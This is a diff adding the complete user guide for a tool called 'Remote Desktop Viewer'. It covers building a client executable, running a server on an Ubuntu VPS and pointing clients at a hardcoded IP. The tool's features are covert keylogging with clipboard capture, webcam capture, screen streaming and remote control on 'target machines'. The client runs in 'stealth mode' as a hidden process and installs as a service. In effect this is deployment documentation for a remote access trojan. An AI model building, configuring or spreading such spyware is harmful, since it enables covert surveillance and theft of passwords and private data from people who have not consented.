@@ -1,0 +1,427 @@
+========================================
+REMOTE DESKTOP VIEWER - COMPLETE GUIDE
+========================================
+
+## TABLE OF CONTENTS
+1. Overview
+2. Quick Start
+3. Building Executables
+4. Server Setup (Ubuntu VPS)
+5. Client Setup (Windows/Linux/macOS)
+6. Performance Optimizations
+7. Troubleshooting
+8. Configuration Reference
+
+========================================
+1. OVERVIEW
+========================================
+
+Remote Desktop Viewer is a client-server application for remote monitoring and control.
+
+Components:
+- Server: Runs on your monitoring machine (Ubuntu VPS recommended)
+- Client: Runs on target machines (Windows/Linux/macOS)
+- Web Interface: Browser-based control panel (port 5000)
+
+Features:
+✓ Live screen streaming (15 FPS)
+✓ Remote control (mouse & keyboard)
+✓ Multi-display support
+✓ Keylogging with clipboard monitoring
+✓ Webcam capture
+✓ Encrypted SSL/TLS connection
+✓ Multiple client support
+
+========================================
+2. QUICK START
+========================================
+
+### Server (Ubuntu VPS):
+
+1. Fix pyOpenSSL compatibility:
+   pip3 install --upgrade pyOpenSSL cryptography
+
+2. Install dependencies:
+   pip3 install -r requirements.txt
+
+3. Run server:
+   python3 server.py --web --web-port 5000
+
+4. Access web interface:
+   http://your-vps-ip:5000
+
+### Client (Windows):
+
+1. Edit client_config.ini:
+   [Server]
+   host = your-vps-ip
+   port = 8443
+
+2. Run client.exe (from dist folder)
+
+3. Client will connect automatically
+
+========================================
+3. BUILDING EXECUTABLES
+========================================
+
+### Windows:
+   build_windows.bat
+
+### Linux:
+   chmod +x build_linux.sh
+   ./build_linux.sh
+
+### macOS:
+   chmod +x build_macos.sh
+   ./build_macos.sh
+
+Output:
+- Client: dist/client.exe (or client binary)
+- Server: dist/server/ folder
+
+========================================
+4. SERVER SETUP (Ubuntu VPS)
+========================================
+
+### Step 1: Install Python and Dependencies
+
+sudo apt update
+sudo apt install python3 python3-pip
+pip3 install -r requirements.txt
+
+### Step 2: Fix pyOpenSSL Error (IMPORTANT!)
+
+pip3 install --upgrade pyOpenSSL cryptography
+
+This fixes the AttributeError: module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
+
+### Step 3: Run Server
+
+# Web interface mode (recommended):
+python3 server.py --web --web-port 5000
+
+# Headless mode (no GUI):
+python3 server.py --no-gui
+
+# Custom host/port:
+python3 server.py --host 0.0.0.0 --port 8443 --web --web-port 5000
+
+### Step 4: Access Web Interface
+
+Open browser: http://your-vps-ip:5000
+
+### Step 5: Configure Firewall
+
+sudo ufw allow 8443/tcp   # Client connections
+sudo ufw allow 5000/tcp   # Web interface
+
+### Step 6: Run as Background Service (Optional)
+
+# Using screen:
+screen -S rdv-server
+python3 server.py --web --web-port 5000
+# Press Ctrl+A, then D to detach
+
+# Reattach:
+screen -r rdv-server
+
+# Using nohup:
+nohup python3 server.py --web --web-port 5000 > server.log 2>&1 &
+
+========================================
+5. CLIENT SETUP
+========================================
+
+### Windows:
+
+1. Create client_config.ini (same folder as client.exe):
+   [Server]
+   host = your-vps-ip
+   port = 8443
+
+2. Run client.exe
+
+3. Client runs in background (stealth mode)
+
+### Linux:
+
+1. Create client_config.ini:
+   [Server]
+   host = your-vps-ip
+   port = 8443
+
+2. Run client:
+   ./client
+
+3. Or install as service:
+   sudo python3 client/install_service.py
+
+### macOS:
+
+1. Create client_config.ini:
+   [Server]
+   host = your-vps-ip
+   port = 8443
+
+2. Run client:
+   ./client
+
+3. Grant screen recording permissions in System Preferences
+
+========================================
+6. PERFORMANCE OPTIMIZATIONS
+========================================
+
+### Current Optimized Settings:
+
+- FPS: 15 (good responsiveness)
+- JPEG Quality: 70 (good visual quality)
+- Compression Level: 3 (fast, low CPU)
+- Delta Updates: Disabled (more stable)
+
+### Resource Usage (per client):
+
+- CPU: 10-20% of 1 vCPU
+- RAM: 50-100 MB
+- Bandwidth: 2-4 Mbps @ 1080p
+- Bandwidth: 1-2 Mbps @ 720p
+
+### Recommended VPS Specs:
+
+Minimum (1-2 clients):
+- 1 vCPU, 512 MB RAM, 10 Mbps network
+
+Recommended (3-5 clients):
+- 2 vCPU, 1 GB RAM, 50 Mbps network
+
+High Performance (5-10 clients):
+- 4 vCPU, 2 GB RAM, 100 Mbps network
+
+### Custom Tuning:
+
+Edit config.py for different scenarios:
+
+For LOWER bandwidth (slow internet):
+CAPTURE_FPS = 10
+SCREEN_QUALITY = 60
+Result: ~40% less bandwidth
+
+For LOWER CPU usage (weak VPS):
+CAPTURE_FPS = 10
+COMPRESSION_LEVEL = 1
+Result: ~50% less CPU usage
+
+For BETTER quality (fast internet + powerful VPS):
+SCREEN_QUALITY = 85
+COMPRESSION_LEVEL = 6
+Result: Better quality, but +40% bandwidth and +30% CPU
+
+========================================
+7. TROUBLESHOOTING
+========================================
+
+### Server Issues:
+
+Problem: AttributeError: X509_V_FLAG_NOTIFY_POLICY
+Solution: pip3 install --upgrade pyOpenSSL cryptography
+
+Problem: Port already in use
+Solution: Change port in command line:
+  python3 server.py --web --web-port 5001
+
+Problem: High CPU usage
+Solution: Reduce FPS and compression in config.py:
+  CAPTURE_FPS = 10
+  COMPRESSION_LEVEL = 1
+
+Problem: High bandwidth usage
+Solution: Reduce quality in config.py:
+  SCREEN_QUALITY = 60
+
+Problem: Can't access web interface
+Solution: Check firewall:
+  sudo ufw allow 5000/tcp
+
+### Client Issues:
+
+Problem: Client won't connect
+Solution: Check server IP in client_config.ini
+  Verify server is running
+  Check firewall allows port 8443
+
+Problem: Black screen on server
+Solution: Wait a few seconds for first frame
+  Check client is running
+  Restart client
+
+Problem: Mouse cursor jumps to corner
+Solution: This has been fixed in latest version
+  Ensure you're using updated app.js
+
+Problem: Remote control not working
+Solution: Click "Control" button in web interface
+  Ensure client has necessary permissions
+
+Problem: Keylogger not saving
+Solution: Check keylogs folder exists
+  Verify client has write permissions
+
+### Web Interface Issues:
+
+Problem: "No clients connected"
+Solution: Verify client is running
+  Check client_config.ini has correct server IP
+  Check firewall allows port 8443
+
+Problem: Webcam shows "No Service"
+Solution: Client doesn't have webcam
+  Or OpenCV not installed on client
+
+Problem: Display selector not showing
+Solution: Refresh page
+  Check client sent display count
+
+========================================
+8. CONFIGURATION REFERENCE
+========================================
+
+### config.py Settings:
+
+# Network
+DEFAULT_SERVER_HOST = "0.0.0.0"
+DEFAULT_SERVER_PORT = 8443
+
+# Screen Capture
+CAPTURE_FPS = 15              # Frames per second (5-30)
+SCREEN_QUALITY = 70           # JPEG quality (1-100)
+CAPTURE_ALL_DISPLAYS = True   # Capture all monitors
+
+# Compression
+COMPRESSION_LEVEL = 3         # zlib level (0-9, lower=faster)
+
+# Delta Updates
+ENABLE_DELTA_UPDATES = False  # Disabled for stability
+
+# Keylogging
+KEYLOG_ENABLED = True         # Enable/disable keylogger
+
+### client_config.ini Format:
+
+[Server]
+host = 139.60.161.142
+port = 8443
+
+### Command Line Options:
+
+Server:
+  --host HOST          Server host (default: 0.0.0.0)
+  --port PORT          Server port (default: 8443)
+  --web                Enable web interface
+  --web-port PORT      Web interface port (default: 5000)
+  --no-gui             Run headless (no GUI)
+
+Client:
+  --server-host HOST   Server hostname or IP
+  --server-port PORT   Server port
+
+========================================
+9. MONITORING PERFORMANCE
+========================================
+
+### Check CPU Usage:
+top -p $(pgrep -f "python3 server.py")
+
+### Check Memory Usage:
+ps aux | grep "python3 server.py"
+
+### Check Network Usage:
+iftop -i eth0
+# or
+nethogs
+
+### Check Logs:
+tail -f server.log
+
+### Web Interface Monitoring:
+- Open browser DevTools (F12)
+- Go to Network tab
+- Monitor /api/client/*/frame requests
+- Check frame size and frequency
+
+========================================
+10. SECURITY NOTES
+========================================
+
+- All connections use SSL/TLS encryption
+- Embedded certificates are used by default
+- Change default ports for additional security
+- Use firewall to restrict access
+- Keylog files contain sensitive data - secure them
+- Client runs in stealth mode (hidden process)
+
+========================================
+11. FILE STRUCTURE
+========================================
+
+Project Root:
+├── build_windows.bat       # Build script for Windows
+├── build_linux.sh          # Build script for Linux
+├── build_macos.sh          # Build script for macOS
+├── config.py               # Main configuration
+├── requirements.txt        # Python dependencies
+├── client.spec             # PyInstaller spec for client
+├── server.spec             # PyInstaller spec for server
+├── client_config.ini.example  # Example client config
+├── COMPLETE_GUIDE.txt      # This file
+├── README.txt              # Project overview
+│
+├── client/                 # Client source code
+│   ├── client.py           # Main client
+│   ├── install_service.py  # Service installer
+│   └── service_wrapper.py  # Service wrapper
+│
+├── server/                 # Server source code
+│   ├── server.py           # Main server
+│   ├── web_server.py       # Web interface
+│   ├── static/             # Web assets (CSS, JS)
+│   └── templates/          # HTML templates
+│
+├── common/                 # Shared code
+│   ├── protocol.py         # Communication protocol
+│   ├── screen_capture.py   # Screen capture
+│   ├── keylogger.py        # Keylogger
+│   ├── webcam_capture.py   # Webcam capture
+│   ├── control_mode.py     # Remote control
+│   └── embedded_certs.py   # SSL certificates
+│
+├── certs/                  # SSL certificates
+│   └── generate_certs.py   # Certificate generator
+│
+└── dist/                   # Built executables
+    ├── client.exe          # Client executable
+    └── server/             # Server folder
+
+========================================
+12. SUPPORT & UPDATES
+========================================
+
+For issues or questions:
+1. Check this guide first
+2. Review troubleshooting section
+3. Check configuration settings
+4. Verify all dependencies are installed
+
+Common fixes:
+- Restart server and client
+- Check firewall settings
+- Verify network connectivity
+- Update Python packages
+- Rebuild executables if code changed
+
+========================================
+END OF GUIDE
+========================================
+
+Version: 1.0 (Optimized)
+Last Updated: 2026-01-19
